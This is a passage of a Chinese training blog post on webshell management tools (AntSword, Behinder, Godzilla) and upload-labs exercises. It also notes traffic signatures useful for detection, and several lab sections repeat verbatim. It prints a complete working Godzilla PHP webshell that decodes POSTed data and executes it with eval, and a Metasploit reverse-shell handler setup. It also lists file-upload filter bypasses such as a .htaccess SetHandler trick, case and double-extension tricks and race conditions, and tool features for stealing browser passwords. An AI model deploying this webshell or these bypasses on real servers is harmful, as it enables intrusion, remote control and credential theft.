+<h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p>AntSword 自 v.1.1.2 版本起内置了代理功能，默认「不使用代理」，你可以根据自己的网络情况，设置使用代理连接Shell。</p>
+<p><img src="ZevY55mQgTYWA_7pIlamZsTMtFeTF3kDu96D6qBgrPc.png" alt="image"></p>
+<p><img src="PSDLGTxk-7ls1ZkNcgxGBQhknpJYnWil6Kh8CLv17ZE.png" alt="image"></p>
+<h5 id="代理有什么用？"><a href="#代理有什么用？" class="headerlink" title="代理有什么用？"></a>代理有什么用？</h5><ul>
+<li>连接处于内网中的Shell</li>
+<li>加快连接速度</li>
+<li>隐藏自身</li>
+<li>与 BurpSuite 等工具配合使用</li>
+</ul>
+<h4 id="Shell-管理"><a href="#Shell-管理" class="headerlink" title="Shell 管理"></a>Shell 管理</h4><p><img src="UZyNIPMWpwwu9nT22ezKqIeOvOFmr_X44A0ux_KKpio.png" alt="image"></p>
+<p>● 编码器</p>
+<p>编码器用于蚁剑客户端与 Shell 通信时的加密、编码操作，是蚁剑一大核心功能。</p>
+<p>灵活使用编码器功能，在连接防火墙后的服务端时有奇效</p>
+<p>● default(默认)</p>
+<p>通信过程不采编码与加密操作，明文传输（不推荐，特殊字符会被转义导致出错）</p>
+<p>● random(随机编码器, 不推荐 已废弃) </p>
+<p>通信过程中在当前 Shell 类型支持的编码器中随机选取一种进行通信编码</p>
+<p>● base64</p>
+<p>通信时使用 base64 编码对通信数据进行编码操作（不推荐，已被WAF作为特征）</p>
+<p>● chr</p>
+<p>PHP 类型独有，通信时使用 chr 函数对传输的字符串进行处理拼接（推荐）</p>
+<p>● hex</p>
+<p>ASPX, CUSTOM 类独有，将通信数据字符转成16进制数据传输（推荐）</p>
+<h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><h4 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h4><h4 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h4><h4 id="插件市场"><a href="#插件市场" class="headerlink" title="插件市场"></a>插件市场</h4><p><img src="JcoBJEc7H49SI1RGpiOOlpEMptHr7ZNq8AIV6--QxFg.png" alt="image"></p>
+<h4 id="流量特征分析"><a href="#流量特征分析" class="headerlink" title="流量特征分析"></a>流量特征分析</h4><p>1.将蚁剑的正文内容进行URL解码后，流量最中明显的特征为@ini_set(“display_errors”,”0”);</p>
+<p>2.这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文。</p>
+<p>3.蚁剑使用加密的时候有eval这种明显的特征。如：rot13、chr16、base64、chr</p>
+<p>4.$oparr、$opdir参数名，参数名加密数据后的数据包也可识别为蚁剑的流量特征。</p>
+<h3 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h3><h4 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h4><p>冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。老牌 Webshell 管理神器——中国菜刀的攻击流量特征明显，容易被各类安全设备检测，实际场景中越来越少使用，加密 Webshell 正变得日趋流行。由于通信流量被加密，传统的 WAF、IDS 设备难以检测，给威胁狩猎带来较大挑战。冰蝎其最大特点就是对交互流量进行对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。冰蝎通信过程中使用AES（高级加密算法，对称加密，微信小程序使用此种方法）进行加密，Java和.NET默认支持AES，php中需要开启openssl扩展，在V2.0版本后，php环境方式根据服务端支持情况动态选择，使得冰蝎更强大。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
+<h4 id="自带shell"><a href="#自带shell" class="headerlink" title="自带shell"></a>自带shell</h4><p>server目录下自带了一些官方shell</p>
+<ul>
+<li>去除动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16]</li>
+<li>增加了插件机制，可开发安装自定义扩展插件</li>
+<li>UI框架由awt改为javafx，重写了大量逻辑</li>
+<li>增强了内网穿透功能，在原有的基于HTTP的socks5隧道基础上，增加了单端口转发功能，可一键将内网端口映射至VPS或者本机端口</li>
+</ul>
+<h4 id="流量解密"><a href="#流量解密" class="headerlink" title="流量解密"></a>流量解密</h4><p><a target="_blank" rel="noopener" href="https://md5jiami.bmcx.com/">https://md5jiami.bmcx.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://tool.lmeee.com/jiami/aes">https://tool.lmeee.com/jiami/aes</a></p>
+<p>payload—》base64加密—》使用eval函数（执行加密后的代码）–》再AES对称加密全部payload—》传输</p>
+<h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><p>1.每一个请求头中存在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br></pre></td></tr></table></figure>
+<p>2.在使用命令执行功能时，请求包中Content-Length: 5784或5804或5824（根据传输的命令的长度变化）</p>
+<h4 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1.基本信息"></a>1.基本信息</h4><p>直接显示出phpinfo，通过此表可以用来信息收集</p>
+<h4 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h4><p>执行命令</p>
+<h4 id="3-虚拟终端"><a href="#3-虚拟终端" class="headerlink" title="3.虚拟终端"></a>3.虚拟终端</h4><p>可以进行cmd.exe，powershell.exe等功能</p>
+<h4 id="4-文件管理"><a href="#4-文件管理" class="headerlink" title="4.文件管理"></a>4.文件管理</h4><p>可以操作管理文件</p>
+<h4 id="5-内网渗透"><a href="#5-内网渗透" class="headerlink" title="5.内网渗透"></a>5.内网渗透</h4><p>可以做隧道</p>
+<h4 id="6-反弹shell"><a href="#6-反弹shell" class="headerlink" title="6.反弹shell"></a>6.反弹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">handler</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">php</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span><br><span class="line"><span class="title">set</span> <span class="title">LHOST</span> 192.168.88.133</span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> 4222</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>
+<p><img src="8wXi2VcKW4Y4gTJfNmhpvPiXwYbanP8qADIPRvNipek.png" alt="image"></p>
+<h4 id="7-管理数据库"><a href="#7-管理数据库" class="headerlink" title="7.管理数据库"></a>7.管理数据库</h4><p>连接数据库</p>
+<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/124248618">https://blog.csdn.net/u012206617/article/details/124248618</a></p>
+<h4 id="介绍：-1"><a href="#介绍：-1" class="headerlink" title="介绍："></a>介绍：</h4><p>哥斯拉继菜刀、蚁剑、冰蝎之后具有更多优点的Webshell管理工具</p>
+<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
+<h4 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h4><p>它能实现的功能除了传统的命令执行、文件管理、数据库管理之外，根据shell类型的不同还包括了：</p>
+<ul>
+<li>MSF联动</li>
+<li>绕过OpenBasedir</li>
+<li>ZIP压缩 ZIP解压</li>
+<li>代码执行</li>
+<li>绕过 DisableFunctions</li>
+<li>Mimikatz</li>
+<li>读取服务器 FileZilla Navicat Sqlyog Winscp XMangager 的配置信息以及密码</li>
+<li>虚拟终端 可以用netcat连接</li>
+<li>Windows权限提升 （2012-2019烂土豆）</li>
+<li>读取服务器 谷歌 IE 火狐 浏览器保存的账号密码</li>
+<li>Windows权限提升烂土豆的C#版本 甜土豆</li>
+<li>支持 哥斯拉 冰蝎 菜刀 ReGeorg 的内存shell 并且支持卸载</li>
+<li>屏幕截图</li>
+<li>Servlet管理 Servlet卸载</li>
+<li>内存加载Jar 将Jar加载到 SystemClassLoader</li>
+</ul>
+<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>生成的PHP马(选择了base64作为加密方式)</p>
+<p><img src="BwkPi0UxD9tbktuSkurfaLEWfOektzoLEqi6xsSgREI.png" alt="image"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();<span class="comment">//创建或者重启一个会话</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="comment">//设置程序最长运行时间：永久</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">// 关闭错误报告</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;<span class="comment">//通过密钥对 $D 进行加/解密</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);<span class="comment">//通过密码传输攻击荷载并解密</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;<span class="comment">//如果有名为payloadname的session就从session中提取攻击载荷</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);<span class="comment">//通过eval执行攻击荷载</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="comment">//将传入的远控命令加密后，取前16位放在返回值前面，其余的放在返回值后面（二次加密）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));<span class="comment">//执行远控命令，并对返回值进行加密</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;   <span class="comment">//如果第一次连接shell，不存在session的话就将攻击载荷存入session</span></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);<span class="comment">//将攻击荷载存储到SESSION</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>解密</p>
+<p><a target="_blank" rel="noopener" href="https://www.bejson.com/runcode/php/">https://www.bejson.com/runcode/php/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;<span class="comment">//通过密钥对 $D 进行加/解密</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;123&#x27;</span>),<span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="木马的利用逻辑"><a href="#木马的利用逻辑" class="headerlink" title="木马的利用逻辑"></a>木马的利用逻辑</h4><p>第一次通信时，服务端通过POST方式传递一个名叫pass的参数给木马，给pass参数赋的值是加密后的一组用”|”隔开的方法，也就是接下来要使用的攻击荷载。荷载在解密后被存入SESSION，供之后使用。</p>
+<p>从第二次通信开始，pass传入的是远控命令，通过攻击荷载中的run()方法执行远控命令。然后对回显进行加密后传输给哥斯拉的服务端。</p>
+<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>1.连接时抓包发现哥斯拉建立连接时会发起三次请求</p>
+<p>第一次请求的数据很长，主要是为了建立session</p>
+<p><img src="fm38-TKyii24Am1QpihhdEJVTGDTY1w91xnwcAIVYok.png" alt="image"></p>
+<p>2.第2个请求中已经自动带上了第1个请求中服务器响应返回的<code>Cookie</code>值，并且第2个请求中只有少量的数据</p>
+<p>特征：</p>
+<p>所有请求中Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8（可以在请求的时候做自定义的修改：配置）</p>
+<p>所有响应中Cache-Control: no-store, no-cache, must-revalidate, post-check&#x3D;0, pre-check&#x3D;0</p>
+<p>以上两个只能作为弱特征参考</p>
+<h4 id="其它模块讲解"><a href="#其它模块讲解" class="headerlink" title="其它模块讲解"></a>其它模块讲解</h4><h2 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法"></a>上传方法</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>upload-labs靶场：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull c0ny1/upload-labs</span><br><span class="line">docker run -d -p <span class="number">8022</span>:<span class="number">80</span> c0ny1/upload-labs</span><br><span class="line">docker run -d -p <span class="number">8023</span>:<span class="number">80</span> monstertsl/upload-labs</span><br><span class="line">http:<span class="comment">//192.168.88.104:8022/</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-1（JS绕过）"><a href="#Less-1（JS绕过）" class="headerlink" title="Less-1（JS绕过）"></a>Less-1（JS绕过）</h3><p>删除</p>
+<p><img src="20rur-ZAQ7qBbGDgqZ0tdX5xl-C87mb_D4ak4UELzxY.png" alt="image"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.88.104:8022/upload/1.php?x=phpinfo();">http://192.168.88.104:8022/upload/1.php?x=phpinfo();</a></p>
+<h3 id="Less-2（文件类型绕过）"><a href="#Less-2（文件类型绕过）" class="headerlink" title="Less-2（文件类型绕过）"></a>Less-2（文件类型绕过）</h3><p>发现这里采用的是后端验证文件类型，但是他只过滤的文件类型，并没有过滤文件后缀名，所以可以上传 php 文件，然后修改 content-type 绕过。</p>
+<p>抓包修改后缀绕过</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.88.104:8022/upload/end.php?x=phpinfo();">http://192.168.88.104:8022/upload/end.php?x=phpinfo();</a></p>
+<h3 id="Less-5（大小写绕过）"><a href="#Less-5（大小写绕过）" class="headerlink" title="Less-5（大小写绕过）"></a>Less-5（大小写绕过）</h3><p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用 <strong>大小写绕过</strong>。</p>
+<p>上传文件<code>webshell.Php</code></p>
+<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>双写绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webshell.pphphp</span><br></pre></td></tr></table></figure>
+<h3 id="Less-17（）"><a href="#Less-17（）" class="headerlink" title="Less-17（）"></a>Less-17（）</h3><p>先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除</p>
+<p>条件竞争，改成.php不断发包，一直访问地址</p>
+<h3 id="Less-1（JS绕过）-1"><a href="#Less-1（JS绕过）-1" class="headerlink" title="Less-1（JS绕过）"></a>Less-1（JS绕过）</h3><p>删除</p>
+<p><img src="20rur-ZAQ7qBbGDgqZ0tdX5xl-C87mb_D4ak4UELzxY.png" alt="image"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.88.104:8022/upload/1.php?x=phpinfo();">http://192.168.88.104:8022/upload/1.php?x=phpinfo();</a></p>
+<h3 id="Less-2（文件类型绕过）-1"><a href="#Less-2（文件类型绕过）-1" class="headerlink" title="Less-2（文件类型绕过）"></a>Less-2（文件类型绕过）</h3><p>发现这里采用的是后端验证文件类型，但是他只过滤的文件类型，并没有过滤文件后缀名，所以可以上传 php 文件，然后修改 content-type 绕过。</p>
+<p>抓包修改后缀绕过</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.88.104:8022/upload/end.php?x=phpinfo();">http://192.168.88.104:8022/upload/end.php?x=phpinfo();</a></p>
+<h3 id="Less-3（跳过）"><a href="#Less-3（跳过）" class="headerlink" title="Less-3（跳过）"></a>Less-3（跳过）</h3><p>黑名单绕过 Apache解析</p>
+<p>环境出问题，跳过</p>
+<p>第三题又是一个新类型的题：黑名单限制文件上传；不允许上传<code>.asp|.aspx|.php|.jsp</code>后缀文件。那么要如何绕过呢？</p>
+<p>Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止</p>
+<p>可以上传例如php3, phtml后缀的文件绕过，前提是 Apache 的 httpd.conf 中配置有如下代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure>
+<p>服务器会将.php3, .phtml后缀的文件当成.php解析。</p>
+<p>然后直接上传后缀名为<code>.phtml</code>的webshell文件，注意这里上传的文件名会改变，可以通过抓包获取文件上传后的随机名称。</p>
+<h3 id="Less-4（-htaccess绕过）"><a href="#Less-4（-htaccess绕过）" class="headerlink" title="Less-4（.htaccess绕过）"></a>Less-4（.htaccess绕过）</h3><p>基本上把那些花里胡哨的后缀都过滤了，但是没有包括<code>.htaccess</code>，可以利用配合Apache的<code>.htaccess</code>文件上传解析漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以实现：网页<span class="number">301</span>重定向、自定义<span class="number">404</span>错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</span><br></pre></td></tr></table></figure>
+<p>然后，上传一个<code>.htaccess</code>内容如下的文件（抓包时删去文件名）:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>这样所有文件都会解析为php</p>
+<p><img src="qxi3xPp2qch9MxZRLJDMEDZ-dAXo4cvCe1JGGv5xLl0.png" alt="image"></p>
+<h3 id="Less-5（大小写绕过）-1"><a href="#Less-5（大小写绕过）-1" class="headerlink" title="Less-5（大小写绕过）"></a>Less-5（大小写绕过）</h3><p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用 <strong>大小写绕过</strong>。</p>
+<p>上传文件<code>webshell.Php</code></p>
+<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="Less-10-1"><a href="#Less-10-1" class="headerlink" title="Less-10"></a>Less-10</h3><p>双写绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webshell.pphphp</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Less-11（）"><a href="#Less-11（）" class="headerlink" title="Less-11（）"></a>Less-11（）</h3><p>get型 %00截断</p>
+<p>环境失败</p>
+<h3 id="Less-12（）"><a href="#Less-12（）" class="headerlink" title="Less-12（）"></a>Less-12（）</h3><p>post型 00截断</p>
+<p>环境失败</p>
+<h3 id="Less-13（）"><a href="#Less-13（）" class="headerlink" title="Less-13（）"></a>Less-13（）</h3><p>图片马绕过</p>
+<p>环境失败</p>
+<h3 id="Less-14（）"><a href="#Less-14（）" class="headerlink" title="Less-14（）"></a>Less-14（）</h3><p>getimagesize检测</p>
+<p>环境失败</p>
+<h3 id="Less-15（）"><a href="#Less-15（）" class="headerlink" title="Less-15（）"></a>Less-15（）</h3><p>exif_imagetype图片马</p>
+<h3 id="Less-16（）"><a href="#Less-16（）" class="headerlink" title="Less-16（）"></a>Less-16（）</h3><p>二次渲染绕过</p>
+<h3 id="Less-17（）-1"><a href="#Less-17（）-1" class="headerlink" title="Less-17（）"></a>Less-17（）</h3><p>先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除</p>
+<p>条件竞争，改成.php不断发包，一直访问地址</p>
+<h3 id="Less-18（）"><a href="#Less-18（）" class="headerlink" title="Less-18（）"></a>Less-18（）</h3><p>条件竞争</p>
+<h3 id="Less-19（）"><a href="#Less-19（）" class="headerlink" title="Less-19（）"></a>Less-19（）</h3><p>post型 00截断</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day6-webshell详解二（下午：webshell管理工具）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">各种管理工具的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">中国菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">中国蚁剑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">使用教程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E6%88%90"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">组成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">代理设置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="toc-number">1.2.2.4.1.</span> <span class="toc-text">代理有什么用？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell-%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">Shell 管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.6.</span> <span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">1.2.2.7.</span> <span class="toc-text">虚拟终端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.8.</span> <span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA"><span class="toc-number">1.2.2.9.</span> <span 